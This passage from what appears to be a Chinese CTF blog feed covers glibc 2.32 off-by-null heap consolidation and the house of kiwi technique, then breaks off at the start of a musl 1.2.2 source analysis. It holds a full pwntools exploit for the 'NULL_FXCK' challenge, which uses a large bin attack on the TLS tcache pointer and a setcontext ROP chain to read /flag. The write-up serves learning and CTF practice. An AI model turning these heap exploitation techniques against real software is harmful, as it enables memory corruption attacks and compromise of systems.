class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">unlink_chunk</span> <span class="params">(mstate av, mchunkptr p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (chunksize (p) != prev_size (next_chunk (p)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br><span class="line"></span><br><span class="line">  mchunkptr fd = p-&gt;fd;</span><br><span class="line">  mchunkptr bk = p-&gt;bk;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line"></span><br><span class="line">  fd-&gt;bk = bk;</span><br><span class="line">  bk-&gt;fd = fd;</span><br><span class="line">  <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (p-&gt;fd_nextsize-&gt;bk_nextsize != p</span><br><span class="line">  || p-&gt;bk_nextsize-&gt;fd_nextsize != p)</span><br><span class="line">malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (fd-&gt;fd_nextsize == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (p-&gt;fd_nextsize == p)</span><br><span class="line">    fd-&gt;fd_nextsize = fd-&gt;bk_nextsize = fd;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      fd-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">      fd-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">      p-&gt;fd_nextsize-&gt;bk_nextsize = fd;</span><br><span class="line">      p-&gt;bk_nextsize-&gt;fd_nextsize = fd;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  p-&gt;fd_nextsize-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">  p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里是验证了p位，如果为0那么就检测前一个chunk的size是否等于当前chunk的size，那么就不能单纯的像以前那样利用了，我们还需要伪造前一个chunk的size了，这里需要用到large bin的机制了。</p><h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><p>既然我们只能进行off by null还需要堆合并，那我们就需要满足上面代码的两项要求，第一就是常规的chunk-&gt;fd-&gt;bk指向本身，其次就是size==prev_size</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220512205902066.png"                      alt="image-20220512205902066"                ></p><p>此时取出size:0x510，由于残留指针，所以还是存在以下的指向关系</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220513100743528.png"                      alt="image-20220513100743528"                ></p><p>并且此时在fd，bk位置伪造prev_size和size，那么我们在下面off by null的时候计算出prev_size即可绕过对于size的检查了。但是此时又出现了一个问题，fake_chunk的fd的bk以及fake_chunk的bk的fd并不指向它本身。那么现在取出size:0x500的chunk，直接覆盖掉其fd指针，使他指向size:0x510，然后large bin当中只剩下一个size:0x520，它的fd和bk都指向了large bin了，所以我们此时需要再free一个size为0x500的chunk，然后把size:0x520取出来进行覆盖，那么即可绕过consolidate时的验证了。</p><h2 id="NULL-FXCK"><a href="#NULL-FXCK" class="headerlink" title="NULL_FXCK"></a>NULL_FXCK</h2><h3 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h3><p>这道题同样是菜单题，但是不同的是在每次选择的时候会验证__malloc_hook和__free_hook以及会清除掉tcache的count。</p><p>然后唯一的漏洞点是modify函数，存在一个off by null但是只能执行一次。并且在delete函数会清空指针。</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>因为只有一次off by null的机会，所以我们能够利用的方式就是上面的堆合并技巧，但是这里的create函数在写入数据的时候总是会把结尾改为\x00并且最小的chunk为0x110所以我们无法直接覆盖内容了，需要利用partial overwrite并且这里的partial overwrite还需要注意一下。我们需要让size:0x510的chunk的地址形式为：0xAAAAAAAAAAAA00AA</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220513130004125.png"                      alt="image-20220513130004125"                ></p><p>形成这样的堆叠，接着申请回来并覆盖值</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220513130252713.png"                      alt="image-20220513130252713"                ></p><p>当然这里由于partial overwrite的缘故第一位是否为0是需要一定概率的(上面的0x1000是因为我还没有计算大小，后续会调整)。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220513130638823.png"                      alt="image-20220513130638823"                ></p><p>可以看到这里就实现了consolidate。</p><p>下面就是泄漏地址了，首先先泄漏堆地址，因为泄漏起来较为简单，在我们consolidate之前我们所显示的堆地址都是以\x00结尾导致无法泄漏，但是在consolidate之后存在以下代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">unlink_chunk (mstate av, mchunkptr p)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (chunksize (p) != prev_size (next_chunk (p)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br><span class="line"></span><br><span class="line">  mchunkptr fd = p-&gt;fd;</span><br><span class="line">  mchunkptr bk = p-&gt;bk;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line"></span><br><span class="line">  fd-&gt;bk = bk;</span><br><span class="line">  bk-&gt;fd = fd;</span><br><span class="line">  ... ...</span><br></pre></td></tr></table></figure><p>导致堆地址写在了其他索引的chunk当中，所以可以非常轻松的泄漏出来，不过这里的main_arena+96非常恶心，结尾是\x00有因为是strlen计算大小打印就导致泄漏不出来，但是这里使用的方法可以继续延续在unsorted bin当中的思路进行切割，但是下一步就是申请大chunk将我们consolidate的chunk放到largin bin当中。</p><p>后面也就是实现任意地址写了，首先想到的肯定就是tcache，虽然题目看起来是没有办法对tcache进行攻击的但是tcache这个结构体也只是因为tls结构存放的指针才起的作用，所以我们可以通过large bin attack来修改tls结构当中的指针，然后在堆块中布置好地址，最后修改地址进行fsop。这里采取的方式就是以前写过的<a href="https://cv196082.gitee.io/2022/03/11/house-of-corrosion-husk-kiwi/">house of kiwi</a>不过以前写的比较匆忙也没有加以实践，可能看起来就会晕头晕脑的，所以这里还是从源码层面分析一边接着放出exp应该会好点。</p><h3 id="house-of-kiwi"><a href="#house-of-kiwi" class="headerlink" title="house of kiwi"></a>house of kiwi</h3><p>先来说一下为什么不能用house of系列中的其他方式，因为这道题的退出函数是_exit然而其他的要求是exit退出或者正常main退出，所以这里只能寻找其他攻击链。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">__malloc_assert (<span class="keyword">const</span> <span class="keyword">char</span> *assertion, <span class="keyword">const</span> <span class="keyword">char</span> *file, <span class="keyword">unsigned</span> <span class="keyword">int</span> line,</span><br><span class="line"> <span class="keyword">const</span> <span class="keyword">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">  (<span class="keyword">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">     __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">     file, line,</span><br><span class="line">     function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">     assertion);</span><br><span class="line">  fflush (<span class="built_in">stderr</span>);</span><br><span class="line">  <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当assert触发时会调用这一函数，中间调用了fflush</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_fflush (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> _IO_flush_all ();</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">int</span> result;</span><br><span class="line">      CHECK_FILE (fp, EOF);</span><br><span class="line">      _IO_acquire_lock (fp);</span><br><span class="line">      result = _IO_SYNC (fp) ? EOF : <span class="number">0</span>;</span><br><span class="line">      _IO_release_lock (fp);</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220513173015804.png"                      alt="image-20220513173015804"                ></p><p>通过调试也可以看到调用关系</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220513173151430.png"                      alt="image-20220513173151430"                ></p><p>并且这里是可读可写的，所以后续就好办了。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.32.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size, content=<span class="literal">None</span></span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;(: Size:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(size), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Content:&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> content <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        r.send(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Index:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Content:&#x27;</span>)</span><br><span class="line">    r.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Index:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    r = process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># r = process(&#x27;./main&#x27;)</span></span><br><span class="line">        create(<span class="number">0x2000</span>)</span><br><span class="line">        create(<span class="number">0x2000</span>)</span><br><span class="line">        create(<span class="number">0xd20</span>)</span><br><span class="line">        create(<span class="number">0x500</span>)  <span class="comment">#3</span></span><br><span class="line">        create(<span class="number">0x4f0</span>)  <span class="comment">#4</span></span><br><span class="line">        create(<span class="number">0x4f0</span>)</span><br><span class="line">        create(<span class="number">0x100</span>)</span><br><span class="line">        create(<span class="number">0x510</span>)</span><br><span class="line">        create(<span class="number">0x100</span>)</span><br><span class="line">        create(<span class="number">0x500</span>)</span><br><span class="line">        create(<span class="number">0x108</span>)  <span class="comment">#10</span></span><br><span class="line">        create(<span class="number">0x4f0</span>)</span><br><span class="line">        create(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">        delete(<span class="number">7</span>)</span><br><span class="line">        create(<span class="number">0x1000</span>)</span><br><span class="line">        delete(<span class="number">7</span>)</span><br><span class="line">        delete(<span class="number">5</span>)</span><br><span class="line">        create(<span class="number">0x1000</span>)</span><br><span class="line">        delete(<span class="number">5</span>)</span><br><span class="line">        delete(<span class="number">3</span>)</span><br><span class="line">        create(<span class="number">0x1000</span>)</span><br><span class="line">        delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">        create(<span class="number">0x500</span>, flat(<span class="number">0</span>, <span class="number">0x1c60</span> + <span class="number">1</span>))  <span class="comment">#3</span></span><br><span class="line">        create(<span class="number">0x4f0</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">8</span> + <span class="string">b&#x27;\x10\n&#x27;</span>)  <span class="comment">#5</span></span><br><span class="line">        delete(<span class="number">4</span>)</span><br><span class="line">        create(<span class="number">0x1000</span>)</span><br><span class="line">        delete(<span class="number">4</span>)</span><br><span class="line">        create(<span class="number">0x510</span>, <span class="string">b&#x27;\x10\n&#x27;</span>)  <span class="comment">#4</span></span><br><span class="line">        create(<span class="number">0x4f0</span>)  <span class="comment">#7---4</span></span><br><span class="line">        edit(<span class="number">10</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x100</span> + p64(<span class="number">0x1c60</span>))</span><br><span class="line">        delete(<span class="number">11</span>)</span><br><span class="line">        show(<span class="number">4</span>)</span><br><span class="line">        context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">        heap_base = u64(</span><br><span class="line">            r.recvuntil(<span class="string">b&#x27;1. Create&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x5a10</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(heap_base))</span><br><span class="line">        create(<span class="number">0x4f0</span>)  <span class="comment">#11</span></span><br><span class="line">        create(<span class="number">0x2000</span>)  <span class="comment">#13</span></span><br><span class="line">        delete(<span class="number">13</span>)</span><br><span class="line">        show(<span class="number">7</span>)</span><br><span class="line">        libc_base = u64(</span><br><span class="line">            r.recvuntil(<span class="string">b&#x27;1. Create&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x1e4280</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">        tls_tcache = libc_base + <span class="number">0x1eb578</span></span><br><span class="line">        _IO_file_jumps_addr = libc_base + <span class="number">0x1e54c0</span></span><br><span class="line">        _IO_file_jumps_SYNC_addr = _IO_file_jumps_addr + <span class="number">0x60</span></span><br><span class="line"></span><br><span class="line">        fake_tcache = <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x7C</span> - <span class="number">0x10</span>)</span><br><span class="line">        fake_tcache += p16(<span class="number">1</span>)</span><br><span class="line">        fake_tcache += p16(<span class="number">1</span>)</span><br><span class="line">        fake_tcache = fake_tcache.ljust(<span class="number">0x270</span> - <span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">        fake_tcache += p64(_IO_file_jumps_SYNC_addr)</span><br><span class="line">        fake_tcache += p64(libc_base + <span class="number">0x1e48c0</span>)</span><br><span class="line"></span><br><span class="line">        payload = fake_tcache</span><br><span class="line">        create(<span class="number">0x4f0</span>, payload)  <span class="comment">#13</span></span><br><span class="line">        delete(<span class="number">4</span>)</span><br><span class="line">        create(<span class="number">0x2000</span>)</span><br><span class="line">        delete(<span class="number">4</span>)</span><br><span class="line">        payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x600</span> + flat(<span class="number">0</span>, <span class="number">0x521</span>, libc_base + <span class="number">0x1e4030</span>, libc_base</span><br><span class="line">                                      + <span class="number">0x1e4030</span>, <span class="number">0</span>, tls_tcache - <span class="number">0x20</span>)</span><br><span class="line">        create(<span class="number">0x600</span> + <span class="number">0x30</span>, payload)</span><br><span class="line">        delete(<span class="number">7</span>)</span><br><span class="line">        create(<span class="number">0x2000</span>)</span><br><span class="line">        delete(<span class="number">7</span>)</span><br><span class="line">        create(<span class="number">0x4f0</span>, fake_tcache)</span><br><span class="line"></span><br><span class="line">        pop_rdi = libc_base + <span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdi\nret&#x27;</span>)))</span><br><span class="line">        pop_rsi = libc_base + <span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rsi\nret&#x27;</span>)))</span><br><span class="line">        pop_rdx = libc_base + <span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdx\nret&#x27;</span>)))</span><br><span class="line">        pop_rax = libc_base + <span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rax\nret&#x27;</span>)))</span><br><span class="line">        syscall = libc_base + <span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;syscall\nret&#x27;</span>)))</span><br><span class="line">        ret = libc_base + <span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;ret&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">        heap_addr = heap_base + <span class="number">0x7298</span></span><br><span class="line">        payload = <span class="string">b&#x27;/flag\x00\x00\x00&#x27;</span></span><br><span class="line">        payload += flat(pop_rdi, heap_addr - <span class="number">0x8</span>, pop_rsi, <span class="number">0</span>, pop_rdx, <span class="number">0</span>,</span><br><span class="line">                        pop_rax, <span class="number">2</span>, syscall)</span><br><span class="line">        payload += flat(pop_rdi, <span class="number">3</span>, pop_rsi, libc_base + libc.bss(), pop_rdx,</span><br><span class="line">                        <span class="number">0x100</span>, pop_rax, <span class="number">0</span>, syscall)</span><br><span class="line">        payload += flat(pop_rdi, <span class="number">1</span>, pop_rsi, libc_base + libc.bss(), pop_rdx,</span><br><span class="line">                        <span class="number">0x100</span>, pop_rax, <span class="number">1</span>, syscall)</span><br><span class="line">        create(<span class="number">0x1200</span>, payload)</span><br><span class="line"></span><br><span class="line">        create(<span class="number">0x590</span>, fake_tcache[<span class="number">48</span>:])</span><br><span class="line">        payload = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0xa0</span> + p64(heap_addr) + p64(ret)</span><br><span class="line">        create(<span class="number">0x400</span>, payload)</span><br><span class="line">        create(<span class="number">0x3f0</span>, p64(libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">61</span> + libc_base))</span><br><span class="line"></span><br><span class="line">        delete(<span class="number">15</span>)</span><br><span class="line">        <span class="comment"># delete(9)</span></span><br><span class="line">        create(</span><br><span class="line">            <span class="number">0xb40</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0xb08</span> +</span><br><span class="line">            flat(<span class="number">0x521</span> | <span class="number">4</span>, libc_base + <span class="number">0x1e4030</span>, libc_base + <span class="number">0x1e4030</span>,</span><br><span class="line">                 heap_base + <span class="number">0x6020</span>, heap_base + <span class="number">0x6020</span>))</span><br><span class="line">        create(<span class="number">0x610</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x608</span> + p64(<span class="number">0x500</span> | <span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">        create(<span class="number">0x510</span>)</span><br><span class="line">        r.recvuntil(<span class="string">b&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">        r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">        r.recvuntil(<span class="string">b&#x27;(: Size:&#x27;</span>)</span><br><span class="line">        r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="number">0x2000</span>), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        <span class="comment"># gdb.attach(r)</span></span><br><span class="line">        <span class="comment"># pause()</span></span><br><span class="line">        context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        r.close()</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>在前面chunk布局的时候最好多放点chunk，不然就跟我一样后续加很麻烦。</p><hr><p>参考文章：</p><p><a class="link"   href="https://www.anquanke.com/post/id/235598" >https://www.anquanke.com/post/id/235598<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;看我前面的文章可以发现我在做漏洞利用的总结主要是在glibc2.31以下版本的，这也就导致了在后续版本的glibc的利用方式我也没怎么掌握，后续打算将house of kiwi以及house of Emma写完之后会关注一下glibc2.31之后的how2heap的poc，</summary>
      
    
    
    
    <category term="pwn" scheme="https://cv196082.gitee.io/categories/pwn/"/>
    
    
    <category term="HeapFengShui" scheme="https://cv196082.gitee.io/tags/HeapFengShui/"/>
    
    <category term="house of 系列" scheme="https://cv196082.gitee.io/tags/house-of-%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>musl1.2.2源码分析+starCTF-BabyNote复现</title>
    <link href="https://cv196082.gitee.io/2022/05/10/musl1-2-2%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-starCTF-BabyNote%E5%A4%8D%E7%8E%B0/"/>
    <id>https://cv196082.gitee.io/2022/05/10/musl1-2-2%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-starCTF-BabyNote%E5%A4%8D%E7%8E%B0/</id>
    <published>2022-05-10T08:30:48.000Z</published>
    <updated>2022-05-10T08:29:45.560Z</updated>
    
    <content type="html"><![CDATA[<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><h3 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h3><p>这里根据我参考的文章来进行分析，chunk-&gt;group-&gt;mate</p><h4 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a><strong>chunk</strong></h4><p>这里其实是没有定义chunk这个结构的，不过根据效果可以推断出来</p><p>chunk关于0x10字节对其，如果是group中的第一个chunk，p的前0x10字节作为group结构体的头部，包括meta地址等。<br>如果不是第一个chunk，只有前4字节作为元数据，包括了idx和offset，用来计算与该chunk与group地址的偏移。如果该chunk被释放，idx会被写为0xff，offset为0。<br>idx和offset的作用就是free时根据chunk地址找到该group对应meta的地址，也为漏洞利用做了铺垫。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span>&#123;</span></span><br><span class="line"> <span class="keyword">char</span> prev_user_data[];</span><br><span class="line">    <span class="keyword">uint8_t</span> idx;  <span class="comment">//低5bit为idx第几个chunk</span></span><br><span class="line">    <span class="keyword">uint16_t</span> offset; <span class="comment">//与第一个chunk起始地址的偏移，实际地址偏移为offset * UNIT</span></span><br><span class="line">    <span 